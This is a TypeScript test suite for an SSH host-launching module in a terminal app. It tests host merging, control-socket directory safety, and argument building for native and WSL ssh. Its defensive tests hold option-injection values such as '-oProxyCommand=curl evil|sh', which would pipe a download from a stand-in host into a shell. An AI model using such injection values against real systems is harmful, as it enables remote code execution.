import { execFileSync, spawnSync } from "node:child_process"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { afterEach, beforeEach, describe, expect, it } from "vitest"
import type { RemoteRef } from "../src/types"
import { defaultSettings, type SshSettings } from "../src/settings/schema"
import {
  buildSshSpawn,
  controlDir,
  controlPathFits,
  hostDetail,
  isSafeControlDir,
  mergeHosts,
  reuseFlags,
  trustedRemote,
  WSL_SSH_SCRIPT,
  type SpawnContext,
} from "./ssh-hosts"
import type { SshHost } from "../src/types"

const ssh = (over: Partial<SshSettings> = {}): SshSettings => ({ ...defaultSettings.ssh, ...over })

describe("hostDetail", () => {
  it("formats user@hostname:port from the parts that are set", () => {
    expect(hostDetail({ alias: "a", hostName: "h", user: "u", port: "2222" })).toBe("u@h:2222")
    expect(hostDetail({ alias: "a", hostName: "h" })).toBe("h")
    expect(hostDetail({ alias: "a", hostName: "h", port: "2222" })).toBe("h:2222")
  })

  it("hides the default port", () => {
    expect(hostDetail({ alias: "a", hostName: "h", port: "22" })).toBe("h")
  })

  it("uses the alias as host when only User is set, and nothing when neither is", () => {
    expect(hostDetail({ alias: "box", user: "u" })).toBe("u@box")
    expect(hostDetail({ alias: "box" })).toBeUndefined()
    expect(hostDetail({ alias: "box", port: "2200" })).toBeUndefined()
  })
})

describe("mergeHosts", () => {
  it("builds config hosts with stable ids, env and detail", () => {
    const hosts = mergeHosts({
      native: [{ alias: "web", hostName: "10.0.0.1", user: "me" }, { alias: "db" }],
      wsl: [],
      settings: ssh(),
    })
    expect(hosts).toEqual([
      {
        hostId: "native:web",
        label: "web",
        target: "web",
        env: "native",
        source: "config",
        detail: "me@10.0.0.1",
      },
      { hostId: "native:db", label: "db", target: "db", env: "native", source: "config" },
    ])
  })

  it("keeps the same alias separately per environment", () => {
    const hosts = mergeHosts({
      native: [{ alias: "gpu" }],
      wsl: [
        ["Ubuntu", [{ alias: "gpu" }]],
        ["Debian", [{ alias: "gpu" }]],
      ],
      settings: ssh(),
    })
    expect(hosts.map((h) => [h.hostId, h.env])).toEqual([
      ["native:gpu", "native"],
      ["wsl:Ubuntu:gpu", "wsl:Ubuntu"],
      ["wsl:Debian:gpu", "wsl:Debian"],
    ])
  })

  it("appends settings hosts with their args and env", () => {
    const hosts = mergeHosts({
      native: [{ alias: "web" }],
      wsl: [],
      settings: ssh({
        hosts: [
          { name: "gpu box", target: "ubuntu@10.0.0.12", args: ["-p", "2222"], env: "native" },
          { name: "plain", target: "plain", args: [], env: "wsl:Ubuntu" },
        ],
      }),
    })
    expect(hosts.slice(1)).toEqual([
      {
        hostId: "settings:gpu box",
        label: "gpu box",
        target: "ubuntu@10.0.0.12",
        env: "native",
        source: "settings",
        extraArgs: ["-p", "2222"],
        detail: "ubuntu@10.0.0.12",
      },
      {
        hostId: "settings:plain",
        label: "plain",
        target: "plain",
        env: "wsl:Ubuntu",
        source: "settings",
      },
    ])
  })

  it("copies settings args (the host list never aliases the settings object)", () => {
    const args = ["-p", "2222"]
    const settings = ssh({ hosts: [{ name: "x", target: "x", args, env: "native" }] })
    const [h] = mergeHosts({ native: [], wsl: [], settings })
    expect(h!.extraArgs).toEqual(args)
    expect(h!.extraArgs).not.toBe(args)
  })

  it("filters hidden aliases and names in every source", () => {
    const hosts = mergeHosts({
      native: [{ alias: "github.com" }, { alias: "keep" }],
      wsl: [["Ubuntu", [{ alias: "github.com" }]]],
      settings: ssh({
        hidden: ["github.com", "secret"],
        hosts: [{ name: "secret", target: "s", args: [], env: "native" }],
      }),
    })
    expect(hosts.map((h) => h.hostId)).toEqual(["native:keep"])
  })

  it("lists only settings hosts when fromSshConfig is off", () => {
    const hosts = mergeHosts({
      native: [{ alias: "web" }],
      wsl: [["Ubuntu", [{ alias: "w" }]]],
      settings: ssh({
        fromSshConfig: false,
        hosts: [{ name: "x", target: "x", args: [], env: "native" }],
      }),
    })
    expect(hosts.map((h) => h.hostId)).toEqual(["settings:x"])
  })

  it("skips config aliases that aren't safe ssh destinations", () => {
    const hosts = mergeHosts({
      native: [{ alias: "my box" }, { alias: "-oProxyCommand=x" }, { alias: "ok" }],
      wsl: [],
      settings: ssh(),
    })
    expect(hosts.map((h) => h.hostId)).toEqual(["native:ok"])
  })

  it("skips a WSL distro whose name isn't a valid env", () => {
    const hosts = mergeHosts({ native: [], wsl: [["bad name", [{ alias: "a" }]]], settings: ssh() })
    expect(hosts).toEqual([])
  })

  it("never returns duplicate ids", () => {
    const hosts = mergeHosts({ native: [{ alias: "a" }, { alias: "a" }], wsl: [], settings: ssh() })
    expect(hosts.map((h) => h.hostId)).toEqual(["native:a"])
  })

  it("returns [] for nothing", () => {
    expect(mergeHosts({ native: [], wsl: [], settings: ssh() })).toEqual([])
  })
})

describe("control dir", () => {
  it("fits a normal home under the socket limit", () => {
    expect(controlPathFits("/Users/someone/.config/smterm/cm")).toBe(true)
    expect(controlDir("/Users/someone", 501)).toBe("/Users/someone/.config/smterm/cm")
  })

  it("falls back to /tmp/smterm-<uid> for a long home", () => {
    const home = "/Users/" + "x".repeat(40)
    expect(controlPathFits(path.posix.join(home, ".config/smterm/cm"))).toBe(false)
    expect(controlDir(home, 501)).toBe("/tmp/smterm-501")
    expect(controlPathFits("/tmp/smterm-501")).toBe(true)
  })

  it("counts bytes, not characters", () => {
    // 45 characters but 93 bytes: fits if counted in chars, not in bytes
    const home = "/" + "é".repeat(4) + "文".repeat(22)
    const dir = path.posix.join(home, ".config/smterm/cm")
    expect(dir.length + 58).toBeLessThanOrEqual(103)
    expect(controlPathFits(dir)).toBe(false)
  })

  it("accepts exactly the limit and rejects one byte more", () => {
    const at = "/" + "a".repeat(103 - 58 - 1)
    expect(controlPathFits(at)).toBe(true)
    expect(controlPathFits(at + "a")).toBe(false)
  })
})

describe("isSafeControlDir", () => {
  const ok = { isDirectory: true, isSymbolicLink: false, uid: 501, mode: 0o40700 }

  it("accepts a private dir we own", () => {
    expect(isSafeControlDir(ok, 501)).toBe(true)
  })

  it("rejects someone else's dir, symlinks, files, and group/world access", () => {
    expect(isSafeControlDir({ ...ok, uid: 0 }, 501)).toBe(false)
    expect(isSafeControlDir({ ...ok, isSymbolicLink: true }, 501)).toBe(false)
    expect(isSafeControlDir({ ...ok, isDirectory: false }, 501)).toBe(false)
    expect(isSafeControlDir({ ...ok, mode: 0o40750 }, 501)).toBe(false)
    expect(isSafeControlDir({ ...ok, mode: 0o40701 }, 501)).toBe(false)
    expect(isSafeControlDir({ ...ok, mode: 0o41777 }, 501)).toBe(false)
  })
})

describe("reuseFlags", () => {
  it("builds quoted ControlMaster options", () => {
    expect(reuseFlags("/home/me/.config/smterm/cm")).toEqual([
      "-o",
      "ControlMaster=auto",
      "-o",
      'ControlPath="/home/me/.config/smterm/cm/%C"',
      "-o",
      "ControlPersist=10m",
    ])
  })

  it("keeps spaces inside the quotes and escapes %", () => {
    expect(reuseFlags("/Users/Jo Doe/100%/cm")[3]).toBe('ControlPath="/Users/Jo Doe/100%%/cm/%C"')
  })

  it("gives up on paths ssh can't parse safely", () => {
    expect(reuseFlags('/home/"q"/cm')).toEqual([])
    expect(reuseFlags("/home/a\nb/cm")).toEqual([])
    expect(reuseFlags("/home/a\tb/cm")).toEqual([])
  })
})

describe("buildSshSpawn", () => {
  const remote: RemoteRef = { hostId: "native:web", label: "web", target: "web", env: "native" }
  const mac: SpawnContext = {
    platform: "darwin",
    sshPath: "ssh",
    controlDir: "/u/.config/smterm/cm",
    reuse: true,
  }
  const win: SpawnContext = {
    platform: "win32",
    sshPath: "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
    controlDir: null,
    reuse: true,
  }

  it("adds reuse flags on macOS/Linux, then -t -- target", () => {
    expect(buildSshSpawn(remote, mac)).toEqual({
      file: "ssh",
      args: [...reuseFlags("/u/.config/smterm/cm"), "-t", "--", "web"],
    })
    expect(buildSshSpawn(remote, { ...mac, platform: "linux" })!.args).toContain(
      "ControlMaster=auto",
    )
  })

  it("omits reuse when disabled or when no safe control dir exists", () => {
    expect(buildSshSpawn(remote, { ...mac, reuse: false })!.args).toEqual(["-t", "--", "web"])
    expect(buildSshSpawn(remote, { ...mac, controlDir: null })!.args).toEqual(["-t", "--", "web"])
  })

  it("never adds reuse for Windows ssh.exe", () => {
    expect(buildSshSpawn(remote, { ...win, controlDir: "C:\\x" })).toEqual({
      file: "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
      args: ["-t", "--", "web"],
    })
  })

  it("puts settings args before `--` and the target after it", () => {
    const r = { ...remote, target: "ubuntu@10.0.0.12", extraArgs: ["-p", "2222", "-A"] }
    const args = buildSshSpawn(r, { ...mac, reuse: false })!.args
    expect(args).toEqual(["-p", "2222", "-A", "-t", "--", "ubuntu@10.0.0.12"])
  })

  it("puts the user's args before our reuse flags, so their -o ControlMaster wins", () => {
    const r = { ...remote, extraArgs: ["-o", "ControlMaster=no"] }
    const args = buildSshSpawn(r, mac)!.args
    expect(args.slice(0, 2)).toEqual(["-o", "ControlMaster=no"])
    expect(args.indexOf("ControlMaster=no")).toBeLessThan(args.indexOf("ControlMaster=auto"))
  })

  it("keeps a hostile-looking target after `--` so ssh can't read it as an option", () => {
    const args = buildSshSpawn(
      { ...remote, target: "-oProxyCommand=evil" },
      { ...mac, reuse: false },
    )!.args
    expect(args.indexOf("--")).toBeLessThan(args.indexOf("-oProxyCommand=evil"))
    expect(args.at(-1)).toBe("-oProxyCommand=evil")
  })

  it("runs a WSL host through the distro's ssh, with the in-distro reuse script", () => {
    const r: RemoteRef = { ...remote, hostId: "wsl:Ubuntu:web", env: "wsl:Ubuntu" }
    // Target first, then the user's args: the script appends our flags after theirs.
    expect(buildSshSpawn({ ...r, extraArgs: ["-A"] }, win)).toEqual({
      file: "wsl.exe",
      args: [
        "-d",
        "Ubuntu",
        "--cd",
        "~",
        "-e",
        "sh",
        "-c",
        WSL_SSH_SCRIPT,
        "smterm-ssh",
        "web",
        "-A",
      ],
    })
  })

  it("runs a WSL host with plain ssh when reuse is off", () => {
    const r: RemoteRef = { ...remote, env: "wsl:Ubuntu", extraArgs: ["-p", "1"] }
    expect(buildSshSpawn(r, { ...win, reuse: false })).toEqual({
      file: "wsl.exe",
      args: ["-d", "Ubuntu", "--cd", "~", "-e", "ssh", "-p", "1", "-t", "--", "web"],
    })
  })

  it("never appends WSL shell-integration args", () => {
    const r: RemoteRef = { ...remote, env: "wsl:Ubuntu" }
    const args = buildSshSpawn(r, win)!.args
    expect(args).not.toContain("--rcfile")
    expect(args).not.toContain("--") // the script adds ssh's own `--` in the distro
  })

  it("returns null for a WSL host off Windows, or a malformed env", () => {
    expect(buildSshSpawn({ ...remote, env: "wsl:Ubuntu" }, mac)).toBeNull()
    expect(buildSshSpawn({ ...remote, env: "bogus" as RemoteRef["env"] }, mac)).toBeNull()
  })
})

const hasSh = spawnSync("sh", ["-c", "true"]).status === 0

// Runs the WSL script with a real POSIX sh and a stub `ssh` that prints its argv, one per
// line, so we test the actual shell logic (dir choice, 0700, ownership, arg passing).
describe.runIf(hasSh && process.platform !== "win32")("WSL_SSH_SCRIPT (real sh)", () => {
  let tmp: string
  let bin: string
  beforeEach(() => {
    // Directly under /tmp: an OS temp dir like /var/folders/… is long enough to trip the
    // socket-length fallback we test separately.
    tmp = fs.mkdtempSync("/tmp/sw-")
    bin = path.join(tmp, "bin")
    fs.mkdirSync(bin)
    fs.writeFileSync(
      path.join(bin, "ssh"),
      '#!/bin/sh\nfor a in "$@"; do printf "%s\\n" "$a"; done\n',
      { mode: 0o755 },
    )
  })
  afterEach(() => fs.rmSync(tmp, { recursive: true, force: true }))

  // Same argv shape buildSshSpawn produces: target first, then the user's extra args.
  const run = (home: string, target: string, extra: string[] = []) =>
    execFileSync("sh", ["-c", WSL_SSH_SCRIPT, "smterm-ssh", target, ...extra], {
      env: { PATH: `${bin}:/usr/bin:/bin`, HOME: home },
      encoding: "utf8",
    })
      .split("\n")
      .filter((l, i, all) => i < all.length - 1 || l !== "")

  it("creates ~/.config/smterm/cm as 0700 and adds the reuse flags", () => {
    const home = path.join(tmp, "h")
    fs.mkdirSync(home)
    const out = run(home, "web")
    const dir = path.join(home, ".config/smterm/cm")
    expect(out).toEqual([
      "-o",
      "ControlMaster=auto",
      "-o",
      `ControlPath="${dir}/%C"`,
      "-o",
      "ControlPersist=10m",
      "-t",
      "--",
      "web",
    ])
    expect(fs.statSync(dir).mode & 0o777).toBe(0o700)
  })

  it("passes arguments with spaces and quotes through intact, user args first", () => {
    const home = path.join(tmp, "h")
    fs.mkdirSync(home)
    const out = run(home, 'we"b', ["-o", "SetEnv=A=b c"])
    expect(out.slice(0, 2)).toEqual(["-o", "SetEnv=A=b c"])
    expect(out.slice(-3)).toEqual(["-t", "--", 'we"b'])
  })

  it("keeps a target that looks like an option after `--`", () => {
    const home = path.join(tmp, "h")
    fs.mkdirSync(home)
    expect(run(home, "-oProxyCommand=x").slice(-2)).toEqual(["--", "-oProxyCommand=x"])
  })

  it("falls back to plain ssh when the dir is a symlink", () => {
    const home = path.join(tmp, "h")
    fs.mkdirSync(path.join(home, ".config/smterm"), { recursive: true })
    fs.mkdirSync(path.join(tmp, "elsewhere"))
    fs.symlinkSync(path.join(tmp, "elsewhere"), path.join(home, ".config/smterm/cm"))
    expect(run(home, "web", ["-A"])).toEqual(["-A", "-t", "--", "web"])
  })

  it("falls back to plain ssh when the home path contains % or a quote", () => {
    for (const name of ["100%", 'a"b']) {
      const home = path.join(tmp, name)
      fs.mkdirSync(home)
      expect(run(home, "web", ["-A"])).toEqual(["-A", "-t", "--", "web"])
    }
  })

  it("falls back to plain ssh when the dir can't be created", () => {
    const home = path.join(tmp, "ro")
    fs.mkdirSync(home)
    fs.writeFileSync(path.join(home, ".config"), "a file, not a dir")
    expect(run(home, "web")).toEqual(["-t", "--", "web"])
  })

  it("uses /tmp/smterm-<uid> for a long home", () => {
    const uid = os.userInfo().uid
    const fallback = `/tmp/smterm-${uid}`
    const existed = fs.existsSync(fallback)
    try {
      const out = run("/" + "x".repeat(60), "web")
      const cp = out.find((l) => l.startsWith("ControlPath="))
      if (cp) expect(cp).toBe(`ControlPath="${fallback}/%C"`)
      else expect(out).toEqual(["-t", "--", "web"]) // /tmp/smterm-<uid> exists but isn't ours/private
    } finally {
      if (!existed) fs.rmSync(fallback, { recursive: true, force: true })
    }
  })
})

const sshBin = spawnSync("ssh", ["-V"]).status === 0

// The real OpenSSH must accept our quoted -o ControlPath (with spaces and escaped %).
// `ssh -G` prints the resolved config without connecting.
describe.runIf(sshBin && process.platform !== "win32")("reuseFlags with real ssh -G", () => {
  it("parses the quoted ControlPath, keeping spaces and turning %% into %", () => {
    const out = execFileSync(
      "ssh",
      ["-G", "-F", "/dev/null", ...reuseFlags("/tmp/a b/100%/cm"), "example.invalid"],
      {
        encoding: "utf8",
      },
    )
    const line = out.split("\n").find((l) => l.startsWith("controlpath "))
    expect(line).toBeDefined()
    expect(line!.startsWith("controlpath /tmp/a b/100%/cm/")).toBe(true)
    expect(out).toMatch(/^controlmaster auto$/m)
    expect(out).toMatch(/^controlpersist 600$/m)
  })
})

describe("trustedRemote", () => {
  const listed: SshHost[] = [
    { hostId: "native:web", label: "web", target: "web", env: "native", source: "config" },
    {
      hostId: "settings:gpu",
      label: "gpu",
      target: "ubuntu@10.0.0.12",
      env: "native",
      source: "settings",
      extraArgs: ["-p", "2222"],
    },
  ]

  it("uses main's own copy of a listed host, ignoring what the renderer sent", () => {
    const sent = {
      hostId: "settings:gpu",
      label: "x",
      target: "evil",
      env: "wsl:Other",
      extraArgs: ["-oProxyCommand=curl evil|sh"],
    }
    expect(trustedRemote(sent, listed)).toEqual({
      hostId: "settings:gpu",
      label: "gpu",
      target: "ubuntu@10.0.0.12",
      env: "native",
      extraArgs: ["-p", "2222"],
    })
  })

  it("never lets a config host gain extra args", () => {
    const sent = {
      hostId: "native:web",
      label: "web",
      target: "web",
      env: "native",
      extraArgs: ["-v"],
    }
    expect(trustedRemote(sent, listed)).toEqual({
      hostId: "native:web",
      label: "web",
      target: "web",
      env: "native",
    })
  })

  it("copies a listed host's args (no aliasing)", () => {
    const r = trustedRemote({ hostId: "settings:gpu" }, listed)!
    expect(r.extraArgs).not.toBe(listed[1]!.extraArgs)
  })

  it("keeps an unlisted host usable with its own validated target and no extra args", () => {
    const sent = {
      hostId: "native:gone",
      label: "gone",
      target: "gone.example",
      env: "native",
      extraArgs: ["-A"],
    }
    expect(trustedRemote(sent, listed)).toEqual({
      hostId: "native:gone",
      label: "gone",
      target: "gone.example",
      env: "native",
    })
  })

  it("rejects an unlisted host with an unsafe target or env", () => {
    for (const bad of [
      { hostId: "x", target: "-oProxyCommand=x", env: "native" },
      { hostId: "x", target: "a b", env: "native" },
      { hostId: "x", target: "ok", env: "wsl:bad name" },
      { hostId: "x", target: "ok" },
    ]) {
      expect(trustedRemote(bad, listed)).toBeNull()
    }
  })

  it("rejects non-objects and a missing hostId", () => {
    for (const bad of [null, undefined, "native:web", 3, {}, { hostId: "" }, { hostId: 1 }]) {
      expect(trustedRemote(bad, listed)).toBeNull()
    }
  })

  it("falls back to the target as label and caps a long label", () => {
    expect(trustedRemote({ hostId: "x", target: "t", env: "native" }, [])!.label).toBe("t")
    expect(trustedRemote({ hostId: "x", target: "t", env: "native", label: "  " }, [])!.label).toBe(
      "t",
    )
    expect(
      trustedRemote({ hostId: "x", target: "t", env: "native", label: "y".repeat(500) }, [])!.label,
    ).toHaveLength(200)
  })
})
